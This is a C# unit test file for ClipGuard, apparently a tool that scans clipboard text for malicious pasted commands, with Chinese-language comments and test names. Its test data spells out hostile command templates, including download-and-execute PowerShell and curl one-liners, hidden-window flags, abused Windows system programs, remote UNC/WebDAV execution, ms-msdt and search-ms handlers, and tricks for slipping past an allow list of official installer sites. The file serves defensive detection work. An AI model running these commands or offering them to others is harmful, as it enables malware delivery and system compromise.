using System.Diagnostics;
using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

// #20（下載後執行、-WindowStyle、官方安裝網站清單）與 #21（LOLBin、UNC/WebDAV、protocol handler）。
// 樣本在執行時用片段組合（docs/detection-rules.md §8）：InlineData 裡只放 {ps}、{iex} 這類代號，
// 完整的指令只存在於執行時；網址一律用 example.invalid。
public class CommandDownloadLolbinTests
{
    private const string Url = "https://example.invalid/a";

    private static readonly (string Token, string Value)[] Tokens =
    [
        ("{ps}", string.Concat("power", "shell")),
        ("{pwsh}", string.Concat("pw", "sh")),
        ("{iex}", string.Concat("i", "ex")),
        ("{irm}", string.Concat("i", "rm")),
        ("{iwr}", string.Concat("i", "wr")),
        ("{hta}", string.Concat("ms", "hta")),
        ("{url}", Url),
    ];

    private static string S(string template)
    {
        foreach (var (token, value) in Tokens) template = template.Replace(token, value);
        return template;
    }

    private static ThreatLevel Level(string template) => CommandDetector.Analyze(S(template)).Level;

    // ---- F3：-WindowStyle ----

    [Theory]
    [InlineData("-w", "hidden")]
    [InlineData("-w", "1")]
    [InlineData("-w", "'1'")]
    [InlineData("-w", "\"Hidden\"")]
    [InlineData("-wi", "hidden")]
    [InlineData("-win", "h")]
    [InlineData("-WindowSt", "Hidden")]
    [InlineData("-windowstyle", "1")]
    [InlineData("-WINDOWSTYLE", "HIDDEN")]
    [InlineData("/w", "hidden")]
    [InlineData("/WindowStyle", "1")]
    [InlineData("\u2013w", "1")]
    [InlineData("\u2014WindowStyle", "Hidden")]
    [InlineData("-w:", "hidden")]
    public void 各種寫法的隱藏視窗都會攔截(string flag, string value)
    {
        var sep = flag.EndsWith(':') ? "" : " ";
        Assert.Equal(ThreatLevel.Malicious, Level($"{{ps}} {flag}{sep}{value} -File C:\\x\\a.ps1"));
    }

    [Theory]
    [InlineData("-w 0")]
    [InlineData("-w normal")]
    [InlineData("-w 2")]            // Minimized
    [InlineData("-w 3")]            // Maximized
    [InlineData("-w 10")]
    [InlineData("-WindowStyle Minimized")]
    [InlineData("-wo C:\\x")]       // pwsh 的 -WorkingDirectory
    [InlineData("-what hidden")]    // 不是 -WindowStyle 的前綴
    public void 不是隱藏視窗的參數只提醒(string args)
    {
        Assert.Equal(ThreatLevel.Suspicious, Level($"{{pwsh}} {args} -File C:\\x\\a.ps1"));
    }

    // ---- F4 / F5：下載後執行 ----

    [Theory]
    [InlineData("{irm} {url} | {iex}")]                                          // 沒寫程式名稱
    [InlineData("{iwr} -useb {url} | {iex}")]
    [InlineData("({iwr} {url}).Content | {iex}")]
    [InlineData("{iex}({iwr} '{url}')")]
    [InlineData("{iex} (New-Object Net.WebClient).DownloadString('{url}')")]
    [InlineData("{iex} ((New-Object System.Net.WebClient).DownloadString('{url}'))")]
    [InlineData("Invoke-Expression (Invoke-RestMethod {url})")]
    [InlineData("$c = {iwr} {url}; {iex} $c.Content")]
    [InlineData("$c = (New-Object Net.WebClient).DownloadString('{url}')\n{iex} $c")]
    [InlineData("&([scriptblock]::Create(({irm} {url})))")]
    [InlineData("{ps} -c \"{irm} {url} | {iex}\"")]
    [InlineData("{ps} -nop -c \"{iex}(New-Object Net.WebClient).DownloadString('{url}')\"")]
    [InlineData("{iwr} {url} -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe")]
    [InlineData("{iwr} {url} -OutFile a.exe; & .\\a.exe")]
    [InlineData("Start-BitsTransfer {url} a.exe; saps a.exe")]
    [InlineData("curl -o %TEMP%\\a.exe {url} && %TEMP%\\a.exe")]
    [InlineData("curl -s -o a.exe {url} & start a.exe")]
    [InlineData("certutil -urlcache -f {url} a.exe & a.exe")]
    public void 下載後執行本身就會攔截(string template)
    {
        var v = CommandDetector.Analyze(S(template));
        Assert.Equal(ThreatLevel.Malicious, v.Level);
        Assert.Contains("下載後直接執行", v.Reasons);
    }

    [Theory]
    [InlineData("curl -s {url} | cmd")]
    [InlineData("curl -s {url} | cmd.exe")]
    [InlineData("curl -s {url} | {ps} -")]
    [InlineData("curl.exe -s {url} | {pwsh} -")]
    [InlineData("C:\\Windows\\System32\\curl.exe -s {url} | {ps} -")]
    [InlineData("cmd /c \"curl -s {url} | {ps} -\"")]
    [InlineData("wget -qO- {url} | sh")]
    [InlineData("curl -fsSL {url} | bash")]
    public void curl_pipe給cmd或PowerShell會攔截(string template)
    {
        Assert.Equal(ThreatLevel.Malicious, Level(template));
    }

    [Fact]
    public void pipe給PowerShell的減號也算呼叫PowerShell()
    {
        Assert.Contains("呼叫 PowerShell", CommandDetector.Analyze(S("curl -s {url} | {ps} -")).Reasons);
    }

    // ---- F17：官方安裝網站清單 ----

    [Theory]
    [InlineData("{irm} get.scoop.sh | {iex}")]
    [InlineData("{iwr} -useb get.scoop.sh | {iex}")]
    [InlineData("{ps} -c \"{irm} https://get.scoop.sh | {iex}\"")]
    [InlineData("{irm} https://astral.sh/uv/install.ps1 | {iex}")]
    [InlineData("{ps} -ExecutionPolicy ByPass -c \"{irm} https://astral.sh/uv/install.ps1 | {iex}\"")]
    [InlineData("curl -LsSf https://astral.sh/uv/install.sh | sh")]
    [InlineData("{irm} bun.sh/install.ps1 | {iex}")]
    [InlineData("{ps} -c \"{irm} bun.sh/install.ps1|{iex}\"")]
    [InlineData("curl -fsSL https://bun.sh/install | bash")]
    [InlineData("{irm} https://deno.land/install.ps1 | {iex}")]
    [InlineData("{irm} https://claude.ai/install.ps1 | {iex}")]
    [InlineData("Set-ExecutionPolicy Bypass -Scope Process -Force; {iex} ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))")]
    [InlineData("{iex} \"& { $({irm} https://aka.ms/install-powershell.ps1) } -UseMSI\"")]
    public void 官方安裝指令只提醒(string template)
    {
        var v = CommandDetector.Analyze(S(template));
        Assert.Equal(ThreatLevel.Suspicious, v.Level);
        Assert.Contains("下載後直接執行", v.Reasons);
    }

    [Fact]
    public void 官方安裝指令連同說明文字一起複製仍只提醒()
    {
        var readme = S("## Install\n\n{irm} https://astral.sh/uv/install.ps1 | {iex}\n\nSee https://github.com/astral-sh/uv for details.");
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(readme).Level);
    }

    [Fact]
    public void 真正的網址放在變數那一行仍會攔截()
    {
        var text = S("$u = '{url}'\n{irm} $u -Headers @{r='https://astral.sh/'} | {iex}");
        Assert.Equal(ThreatLevel.Malicious, CommandDetector.Analyze(text).Level);
        var cmd = S("set u={url}\ncurl -s %u% -H \"r: https://astral.sh/\" | cmd");
        Assert.Equal(ThreatLevel.Malicious, CommandDetector.Analyze(cmd).Level);
    }

    [Fact]
    public void scoop的寫法跟uv和bun一樣提醒()
    {
        var scoop = Level("{irm} get.scoop.sh | {iex}");
        Assert.Equal(Level("{irm} https://astral.sh/uv/install.ps1 | {iex}"), scoop);
        Assert.Equal(Level("{irm} bun.sh/install.ps1 | {iex}"), scoop);
        Assert.Equal(ThreatLevel.Suspicious, scoop);
    }

    [Theory]
    [InlineData("https://astral.sh.example.invalid/x")]       // 子字串，不是子網域
    [InlineData("https://notastral.sh/x")]
    [InlineData("https://astral.sh@example.invalid/x")]       // 帳號欄位
    [InlineData("https://get.scoop.sh:443@example.invalid/x")]
    [InlineData("https://example.invalid\\.astral.sh/x")]     // 反斜線：.NET 會當成 /
    [InlineData("https://example.invalid/astral.sh")]
    [InlineData("https://bun.sh.")]                            // 尾端加點（FQDN 寫法）仍是同一個主機
    public void 官方網站清單比對的是主機名稱(string url)
    {
        var level = CommandDetector.Analyze(S($"{{irm}} {url} | {{iex}}")).Level;
        var expected = url == "https://bun.sh." ? ThreatLevel.Suspicious : ThreatLevel.Malicious;
        Assert.Equal(expected, level);
    }

    [Theory]
    [InlineData("{irm} astral.sh.example.invalid | {iex}")]
    [InlineData("{irm} astral.sh@example.invalid | {iex}")]
    [InlineData("{irm} ('https://astral.sh'+'.example.invalid/x') | {iex}")]       // 串接出來的網址不可信
    [InlineData("{irm} ('https://{0}/x' -f 'astral.sh') | {iex}")]
    [InlineData("{irm} https://astral.sh/uv/install.ps1 | {iex}; {irm} {url} | {iex}")] // 混了清單外的主機
    [InlineData("{irm} $u | {iex}")]                                                // 找不到主機
    [InlineData("{ps} -w hidden -c \"{irm} https://astral.sh/uv/install.ps1 | {iex}\"")] // 官方網站也不能隱藏視窗
    [InlineData("{irm} get.scoop.sh | {iex} # I am not a ro" + "bot")]
    public void 繞過官方網站清單仍會攔截(string template)
    {
        Assert.Equal(ThreatLevel.Malicious, Level(template));
    }

    [Theory]
    [InlineData("astral.sh", true)]
    [InlineData("ASTRAL.SH", true)]
    [InlineData("docs.astral.sh", true)]
    [InlineData("get.scoop.sh", true)]
    [InlineData("scoop.sh", true)]
    [InlineData("bun.sh", true)]
    [InlineData("astral.sh.example.invalid", false)]
    [InlineData("xastral.sh", false)]
    [InlineData("sh", false)]
    [InlineData("example.invalid", false)]
    [InlineData("astral.sh$x", false)]
    public void 官方主機比對(string host, bool expected)
    {
        Assert.Equal(expected, DownloadExecution.IsOfficialHost(host));
    }

    // ---- #21：系統程式 ----

    [Theory]
    [InlineData("cmd /v:on /c \"set x=a&& echo !x!\"")]
    [InlineData("cmd /V:ON /C echo !x!")]
    [InlineData("cmd /q /v:on /c echo !x!")]
    [InlineData("cmd /v /c echo !x!")]
    [InlineData("wscript C:\\Users\\x\\a.vbs")]
    [InlineData("cscript //nologo //e:jscript a.txt")]
    [InlineData("\"C:\\Windows\\System32\\wscript.exe\" a.js")]
    [InlineData("w^script a.vbs")]
    [InlineData("WSCRIPT.EXE \"C:\\x\\a.wsf\"")]
    [InlineData("hh https://example.invalid/a.chm")]
    [InlineData("hh.exe C:\\x\\a.chm")]
    [InlineData("C:\\Windows\\hh.exe C:\\x\\a.chm")]
    [InlineData("cmstp /au C:\\x\\a.inf")]
    [InlineData("cmstp.exe /s a.inf")]
    [InlineData("pcalua -a C:\\x\\a.exe")]
    [InlineData("pcalua \u2013a C:\\x\\a.exe")]
    [InlineData("odbcconf /a {regsvr C:\\x\\a.dll}")]
    [InlineData("odbcconf -f a.rsp")]
    [InlineData("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\x\\a.dll")]
    [InlineData("installutil a.exe")]
    [InlineData("ftp -s:C:\\x\\a.txt")]
    [InlineData("ftp \u2013i \u2013s:a.txt")]
    [InlineData("f\"tp\" -s:a.txt")]
    public void 常被濫用的系統程式會提醒(string text)
    {
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    [Fact]
    public void 延遲展開組出的程式名稱會代入後再判斷()
    {
        // !a!!b! 組回 mshta、後面接遠端網址：正規化後跟直接寫 mshta 一樣（§3.0）。
        var text = "cmd /v:on /c \"set a=ms&& set b=hta&& call !a!!b! " + Url + "\"";
        var v = CommandDetector.Analyze(text);
        Assert.Equal(ThreatLevel.Malicious, v.Level);
        Assert.Contains("mshta 直接執行遠端網址", v.Reasons);
        Assert.Contains("cmd 延遲展開（用 !變數! 組出指令）", v.Reasons);
    }

    // ---- #21：UNC / WebDAV / net use ----

    [Theory]
    [InlineData("\\\\example.invalid\\share\\a.exe")]
    [InlineData("  \"\\\\example.invalid\\share\\a b\\x.lnk\"")]
    [InlineData("start \\\\example.invalid\\s\\a.lnk")]
    [InlineData("start \"\" \"\\\\example.invalid\\s\\a.exe\"")]
    [InlineData("explorer \\\\example.invalid\\s\\a.lnk")]
    [InlineData("C:\\Windows\\explorer.exe \\\\example.invalid\\s\\a.lnk")]
    [InlineData("rundll32 \\\\example.invalid\\s\\a.dll,Run")]
    [InlineData("pcalua -a \\\\example.invalid\\s\\a.exe")]
    [InlineData("\\\\example.invalid@SSL\\DavWWWRoot\\a.lnk")]
    [InlineData("\\\\example.invalid@SSL@443\\DavWWWRoot\\x\\a.cmd")]
    [InlineData("\\\\example.invalid@SSL\\DavWWWRoot\\docs")]
    [InlineData("explorer \\\\example.invalid@SSL\\DavWWWRoot\\docs")]
    [InlineData("net use * \\\\example.invalid@SSL\\DavWWWRoot\\s")]
    [InlineData("pushd \\\\example.invalid@80\\s")]
    [InlineData("net use z: \\\\example.invalid\\s & z:\\a.exe")]
    [InlineData("net use Z: \\\\example.invalid\\s\nstart z:\\a.lnk")]
    [InlineData("net use * \\\\example.invalid\\s && y:\\a.bat")]
    public void 執行遠端分享上的檔案會提醒(string text)
    {
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    [Fact]
    public void 遠端檔案搭配強詐騙訊號才攔截()
    {
        Assert.Equal(ThreatLevel.Malicious,
            CommandDetector.Analyze("\\\\example.invalid@SSL\\DavWWWRoot\\a.lnk # I am not a ro" + "bot").Level);
        Assert.Equal(ThreatLevel.Malicious,
            CommandDetector.Analyze("explorer \\\\example.invalid\\s\\a.lnk" + new string(' ', 40) + "# ok").Level);
    }

    // ---- #21：protocol handler ----

    [Theory]
    [InlineData("search-ms:query=invoice&crumb=location:\\\\example.invalid@SSL\\DavWWWRoot&displayname=Docs")]
    [InlineData("SEARCH-MS:displayname=Docs&crumb=location:\\\\example.invalid\\s")]
    [InlineData("search\u2010ms:query=a&crumb=location:\\\\example.invalid\\s")]
    [InlineData("search:query=a&crumb=location:\\\\example.invalid\\s")]
    [InlineData("ms-msdt:/id PCWDiagnostic /skip force")]
    [InlineData("ms-msdt:-id PCWDiagnostic")]
    public void protocol_handler會提醒(string text)
    {
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    // ---- P1：不該誤報 ----

    [Theory]
    [InlineData("wscript and cscript are the Windows Script Host programs")]
    [InlineData("用 wscript 跑 vbs 是很舊的做法")]
    [InlineData("Use hh to open help files")]
    [InlineData("cmstp is the Connection Manager Profile Installer")]
    [InlineData("pcalua is part of the Program Compatibility Assistant")]
    [InlineData("odbcconf configures ODBC drivers")]
    [InlineData("InstallUtil.exe ships with the .NET Framework")]
    [InlineData("ftp is an old protocol; use sftp instead")]
    [InlineData("I opened explorer and the net use command")]
    [InlineData("檔案放在 \\\\fileserver\\share\\setup.exe，請自行安裝")]
    [InlineData("The installer lives at \\\\fileserver\\it\\tools\\setup.exe on the share.")]
    [InlineData("請到 \\\\fileserver\\share 拿資料")]
    [InlineData("\\\\fileserver\\share")]
    [InlineData("\\\\fileserver\\share\\report.xlsx")]
    [InlineData("net use z: \\\\fileserver\\share")]
    [InlineData("net use z: \\\\fileserver\\share /persistent:yes")]
    [InlineData("SharePoint 可以用 WebDAV 掛載，例如 \\\\contoso.example@SSL\\DavWWWRoot\\sites\\team")]
    [InlineData("我用 search-ms 搜尋檔案")]
    [InlineData("search-ms: is a Windows protocol")]
    [InlineData("ms-msdt is disabled by default now")]
    [InlineData("Hello!World! Wow!great!")]
    [InlineData("cmd 的 /v:on 參數可以開啟延遲展開")]
    [InlineData("| curl | cmd |")]
    [InlineData("| iwr | iex |")]
    [InlineData("iwr and iex are PowerShell aliases")]
    [InlineData("我在學 PowerShell 的 iwr 跟 iex")]
    [InlineData("用 curl 下載後再用 sh 執行，這樣比較危險")]
    public void 提到這些工具的一般文字仍是乾淨(string text)
    {
        Assert.Equal(ThreatLevel.None, CommandDetector.Analyze(text).Level);
    }

    [Fact]
    public void 超大剪貼簿不會卡住()
    {
        var huge = new[]
        {
            string.Concat(Enumerable.Repeat("net use z: \\\\a\\b ", 100_000)),
            string.Concat(Enumerable.Repeat("\\\\a\\b\\", 300_000)),
            string.Concat(Enumerable.Repeat("start \\\\a\\", 200_000)),
            string.Concat(Enumerable.Repeat(S("{irm} x | "), 200_000)),
            string.Concat(Enumerable.Repeat(S("{iex} $"), 200_000)),
            string.Concat(Enumerable.Repeat("search-ms:", 200_000)),
            string.Concat(Enumerable.Repeat("wscript /a ", 200_000)),
        };
        foreach (var text in huge)
        {
            var sw = Stopwatch.StartNew();
            CommandDetector.Analyze(text);
            CommandExplainer.Explain(text);
            Assert.True(sw.ElapsedMilliseconds < 3000, $"took {sw.ElapsedMilliseconds} ms");
        }
    }

    // ---- 白話說明 ----

    [Theory]
    [InlineData("{irm} {url} | {iex}", "從 example.invalid 下載並執行")]
    [InlineData("curl -s {url} | cmd", "從 example.invalid 下載並執行")]
    [InlineData("{iwr} {url} -OutFile a.exe; Start-Process a.exe", "從 example.invalid 下載並執行")]
    [InlineData("{irm} https://astral.sh@example.invalid/x | {iex}", "從 example.invalid 下載並執行")]
    [InlineData("wscript C:\\x\\a.vbs", "用 wscript／cscript 執行腳本檔")]
    [InlineData("hh C:\\x\\a.chm", "用 hh 開啟說明檔，裡面可以藏腳本")]
    [InlineData("cmstp /au a.inf", "用 cmstp 安裝連線設定檔，可藉此執行任意程式")]
    [InlineData("pcalua -a a.exe", "透過 pcalua 間接啟動其他程式")]
    [InlineData("odbcconf /a {regsvr a.dll}", "用 odbcconf 載入並執行 DLL")]
    [InlineData("installutil /U a.dll", "用 InstallUtil 執行 .NET 程式")]
    [InlineData("ftp -s:a.txt", "用 ftp 照一份指令檔執行")]
    [InlineData("cmd /v:on /c echo !x!", "用 cmd 的延遲展開（!變數!）把指令拆開藏起來")]
    [InlineData("\\\\example.invalid\\s\\a.exe", "執行 example.invalid 網路分享上的檔案")]
    [InlineData("\\\\example.invalid@SSL\\DavWWWRoot\\docs", "連到 example.invalid 的 WebDAV 遠端資料夾")]
    [InlineData("search-ms:query=a&crumb=location:\\\\example.invalid\\s", "用 search-ms: 開啟搜尋視窗，裡面的檔案可能來自遠端")]
    [InlineData("ms-msdt:/id PCWDiagnostic", "用 ms-msdt: 呼叫疑難排解工具（Follina 漏洞的手法）")]
    public void 新訊號有白話說明(string template, string expected)
    {
        Assert.Contains(expected, CommandExplainer.Explain(S(template)).Actions);
    }

    [Fact]
    public void 掛載網路磁碟再執行有白話說明()
    {
        var e = CommandExplainer.Explain("net use z: \\\\example.invalid\\s & z:\\a.exe");
        Assert.Contains("掛載網路磁碟後執行裡面的程式", e.Actions);
    }

    [Fact]
    public void 說明也認得新的隱藏視窗寫法()
    {
        var e = CommandExplainer.Explain(S("{ps} /WindowSt 1 -File a.ps1"));
        Assert.Contains("隱藏視窗，執行過程你看不到", e.Actions);
    }
}
